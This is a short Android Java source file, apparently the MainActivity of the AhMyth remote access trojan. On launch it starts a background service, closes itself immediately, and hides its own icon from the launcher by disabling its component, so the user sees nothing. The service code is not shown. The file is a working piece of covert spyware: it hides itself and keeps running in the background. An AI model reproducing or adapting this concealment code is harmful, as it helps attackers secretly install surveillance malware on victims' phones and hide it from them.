package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Start the MainService
        startService(new Intent(this, MainService.class));

        // Finish the current activity
        finish();

        // Hide the app icon from the launcher
        fn_hideicon();
    }

    private void fn_hideicon() {
        // Disable the app's component to hide the icon from the launcher
        getPackageManager().setComponentEnabledSetting(
                getComponentName(),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }
}
